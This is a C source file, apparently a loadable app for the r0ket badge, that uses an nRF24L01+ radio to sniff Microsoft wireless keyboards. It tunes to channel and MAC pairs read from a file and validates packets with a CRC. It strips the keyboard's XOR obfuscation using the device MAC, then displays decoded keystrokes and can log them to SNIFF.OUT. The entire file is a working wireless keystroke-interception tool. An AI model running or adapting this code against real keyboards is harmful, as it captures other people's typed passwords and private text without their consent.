#include <sysinit.h>
#include <string.h>

#include "basic/basic.h"
#include "basic/config.h"

#include "lcd/render.h"
#include "lcd/print.h"

#include "funk/nrf24l01p.h"
#include "filesystem/ff.h"

#include "usetable.h"

/****************************************************************/
/* r0ket l0dable to sniff an Microsoft keyboard                 */
/* expects a KBD.MAC file containing lines with channel and mac */
/*                                                              */
/* crsr right/left changes through these                        */
/* crsr up         toggles writing scancodes to SNIFF.OUT       */
/* crsr down       switches through different debug verbosities */
/* crsr enter      exits                                        */
/****************************************************************/

#define MAC_TABLE_SIZE 50
#define PKTLEN 20  /* actually 19+1/8 */

typedef uint16_t crc;

crc nrf_crc(unsigned char const message[], int nBytes, crc remainder);
crc nrf_crc_bit(char bit, crc remainder);
void dbg_pkt(unsigned char * buf, crc c);
void setup_sniff(char*chmac);
signed char read_chmac(signed int lineno, char chmac[6]);

struct NRF_CFG config = {
    .channel= 1,
    .txmac= "\x0\x0\x0\x0\x0",
    .nrmacs=1,
    .mac0=  "\x0\x0\x0\x0\x0",
    .maclen ="\x14", /* how many bytes to receive */
};

void ram(void) {
    unsigned char buf[PKTLEN+1]; // spare byte, why?
    unsigned char mac[5];
    uint8_t key = BTN_NONE;
    int debug=1;
    int i;
    int ctr=0;
    int lineno=1;
    int writefile=0;
    /*                             1               2               3      
                   0123456789abcdef0123456789abcdef0123456789abcdef01 2345678 */
    char * keys = "____abcdefghijklmnopqrstuvwxyz1234567890#_<_ -=[]\\_;'`,./";
    int myctr=0;
    char chmac[6];

    FIL file;
    UINT writebytes;
    int res;

    if(writefile){
        res=f_open(&file, "SNIFF.OUT", FA_OPEN_ALWAYS|FA_WRITE);
        if(res)
            writefile=0;
        f_lseek(&file, f_size(&file));
    }

    read_chmac(lineno,chmac);
    setup_sniff(chmac);
    for(i=0;i<5;i++){ /* reverse mac for crc (on-air format) */
        mac[4-i]=chmac[1+i];
    };

    do {
        signed char n;
        int k;
        crc nrfcrc;
        char aabit;
        char chr[2];
        int pl;

        key=getInputRaw();
        if(key==BTN_UP){
            writefile=1-writefile;
            if(writefile){
                res=f_open(&file, "SNIFF.OUT", FA_OPEN_ALWAYS|FA_WRITE);
                if(res)
                    writefile=0;
                f_lseek(&file, f_size(&file));
            }else{
                f_close(&file);
            };
            lcdPrint("write=");
            lcdPrintln(IntToStr(writefile,1,0));
            lcdRefresh();
            while(getInputRaw()!=BTN_NONE){delayms(10);};
        };
        if(key==BTN_DOWN){
            debug++;
            if(debug>3)debug=0;
            lcdPrint("dbg=");
            lcdPrintln(IntToStr(debug,1,0));
            lcdRefresh();
            while(getInputRaw()!=BTN_NONE){delayms(10);};
        };
        if(key==BTN_RIGHT|| key==BTN_LEFT){
            while(getInputRaw()!=BTN_NONE){delayms(10);};
            if(key==BTN_RIGHT)
                lineno++;
            if(key==BTN_LEFT)
                lineno--;
            if(lineno<1)
                lineno=1;
            nrf_rcv_pkt_end();
            n=read_chmac(lineno,chmac);
            if(n<0){
                lineno=1;
                read_chmac(lineno,chmac);
            };
            setup_sniff(chmac);
            for(i=0;i<5;i++){ /* reverse mac for crc (on-air format) */
                mac[4-i]=chmac[1+i];
            };
            nrf_config_set(&config);
        };

        n = nrf_rcv_pkt_poll(PKTLEN, buf);
        if (n==0){ /* no packet */
            delayms(20);
            continue;
        };

        if(n!=PKTLEN){
            lcdPrint("Err:");
            lcdPrintln(IntToStr(n,3,0));
            lcdRefresh();
            break;
        };

        /* this bit will be destroyed -- should be 0 anyway */
        aabit=buf[1]>>7;

        for (i=1;i<PKTLEN-1;i++){ /* remove effect of 9-bit pkt ctrl field */
            buf[i]=(buf[i]<<1)|(buf[i+1]>>7);
        };

        pl=buf[0]>>2; /* Enhanced ShockBurst payload length */

        if(pl>PKTLEN-4) /* corrupt length safety */
            continue;

        /* calulate ccitt crc over full packet,
           including that annyoting 9-bit field */
        nrfcrc=0xffff;
        nrfcrc=nrf_crc(mac,5,nrfcrc);
        nrfcrc=nrf_crc(buf,1,nrfcrc);
        nrfcrc=nrf_crc_bit(aabit,nrfcrc);
        nrfcrc=nrf_crc(buf+1,pl+sizeof(crc),nrfcrc); 

        if(nrfcrc!=0 && !(debug==3))
             continue;

        /* keyboard packet handling */

        k=0xff;
        if (pl == 16 || pl==8){
            /* remove "Encryption" */
            for (i=5;i<PKTLEN-2;i++){
                buf[i]=buf[i]^config.mac0[(i-5)%5]; 
            };

            /* calculate Checksum */
            for (i=1;i<PKTLEN-2-1;i++){
                k^=buf[i];
            };
        };

        if(debug){
            if(debug<2 && pl<16)
                continue;
            dbg_pkt(buf,nrfcrc);
            lcdPrint("++:");
            lcdPrint(IntToStr(myctr++,4,0));
            lcdRefresh();
        };

        if (pl==8) /* key held packet */
            continue;
        if (pl==0) /* auto-ack packet */
            continue;

        if (k!=0){
            if(debug){
                lcdPrint("k=");
                lcdPrintln(IntToStr(k,2,F_HEX));
                lcdRefresh();
            };
            continue;
        };

        /* ignore dupes */
        if (ctr == (buf[5]|buf[6]<<8))
            continue;
        ctr=buf[5]|buf[6]<<8;

        if(!debug){ /* just print sniffed keys */
            if(buf[10]==0) /* key_release, or modifier */
                continue;
            if(buf[10]<=0x38){
                chr[0]=keys[buf[10]];
            }else{
                chr[0]='.';
            };
            chr[1]=0;
            lcdPrint(chr);
            lcdCheckNl();
        };
        if(writefile){
            res = f_write(&file, &buf[ 8], 1, &writebytes);
            res = f_write(&file, &buf[10], 1, &writebytes);
        };

        lcdRefresh();
    } while (key!=BTN_ENTER);

    if(writefile){
        res=f_close(&file);
    };

    while(getInputRaw()!=BTN_NONE){delayms(10);};
}

#define WIDTH  (8 * sizeof(crc))
#define TOPBIT (1 << (WIDTH - 1))
#define POLYNOMIAL 0x1021

crc nrf_crc(unsigned char const message[], int nBytes, crc remainder) {
	int byte;
	char bit;

    for (byte = 0; byte < nBytes; ++byte) {
        remainder ^= (message[byte] << (WIDTH - 8));

        for (bit = 8; bit > 0; --bit) {
            if (remainder & TOPBIT) {
                remainder = (remainder << 1) ^ POLYNOMIAL;
            } else {
                remainder = (remainder << 1);
            }
        }
    }
    return (remainder);

}

crc nrf_crc_bit(char bit, crc remainder) {
    remainder ^= (bit & 1) << (WIDTH-1);

    if (remainder & TOPBIT) {
        remainder = (remainder << 1) ^ POLYNOMIAL;
    } else {
        remainder = (remainder << 1);
    }

    return (remainder);
}

void dbg_pkt(unsigned char * buf, crc c){
    char pl=buf[0]>>2;
    int i;

    lcdClear();
    lcdPrint("pl=");
    lcdPrint(IntToStr(buf[0]>>2,2,0));

    lcdPrint(" pid=");
    lcdPrintln(IntToStr(buf[0]&3,2,0));

/*    lcdPrint(" aa:");
    lcdPrintln(IntToStr(aabit,2,F_HEX)); */

    if (pl==0){
        lcdPrintln("");
        lcdPrintln("");
        lcdPrintln("");
        lcdPrintln("");
        lcdPrintln("");
    }else{
        lcdPrint("id:");
        for (i=1;i<=4;i++){
            lcdPrint(IntToStr(buf[i],2,F_HEX));
        };
        lcdPrintln("");

        lcdPrint("ctr:");
        lcdPrint(IntToStr(buf[5]|buf[6]<<8,4,F_HEX));

        if(pl <=8){
            lcdPrint(" 0:");
            lcdPrintln(IntToStr(buf[7],2,F_HEX));
            lcdPrintln("");
            lcdPrintln("");
            lcdPrintln("");
        }else{
            lcdPrintln("");
            lcdPrint("fl=");
            lcdPrintln(IntToStr(buf[7]|buf[8]<<8,4,F_HEX));

            lcdPrint("key=");
            lcdPrintln(IntToStr(buf[10]|buf[9]<<8,4,F_HEX));

            lcdPrint("p:");
            for (i=11;i<=15;i++){
                lcdPrint(IntToStr(buf[i],2,F_HEX));
            };
            lcdPrintln("");
        };
    };

    lcdPrint("crc=");
    lcdPrintln(IntToStr(c,4,F_HEX));
    lcdRefresh();
}

void setup_sniff(char*chmac){
    int i;

    lcdClear();
    lcdPrintln("Ch:MAC");
    for (i=0;i<=5;i++){
        lcdPrint(IntToStr(chmac[i],2,F_HEX));
        if(i==0)
            lcdPrint(":");
    };
    lcdPrintln("");
    lcdRefresh();

//    nrf_rcv_pkt_end();
    config.channel=chmac[0];
    memcpy(config.mac0,chmac+1,5);
    nrf_config_set(&config);
    nrf_rcv_pkt_start(0);
}

int get_line(FIL *filep, char * data, int len){
    unsigned int readbytes;
    int idx=0;
    char dummy[1];
    int res;

    while (1){
        res = f_read(filep, dummy, 1, &readbytes);

        if(res || readbytes<=0){
            return -1;
        };
        if(dummy[0] == 0x0a ){
            break;
        };
        if(idx <len){
            data[idx++]=dummy[0];
        };
    };
    return idx;
}

/* read a line from file */
#define LINELEN 14
signed char read_chmac(signed int lineno, char chmac[6]){
    FIL file;
    char * filename = "kbd.mac";
    char line[LINELEN];
    int i;
    int ctr=0;
    char nibble;
    int res;
    signed int bytes;

    for (i=0;i<6;i++)
        chmac[i]=0;

    res=f_open(&file, filename, FA_OPEN_EXISTING|FA_READ);
    if(res){
        return -1;
    };

    do{
        bytes=get_line(&file,line,LINELEN);
        if(bytes<=0)
            return -1;
    }while(--lineno>0);

    for(i=0;i<bytes;i++){ /* convert ascii-hex to binary */
        if(line[i]>='0' && line[i]<='9'){
            nibble=line[i]-'0';
        }else{
            line[i]&=0xdf;
            if(line[i]>='A' && line[i]<='F'){
                nibble=line[i]-'A'+10;
            }else{
                continue;
            };
        };
        chmac[ctr>>1]|=nibble<<(ctr%2?0:4);
        if(++ctr == 6*2)
            break;
    };

    f_close(&file);
    return 0;
}
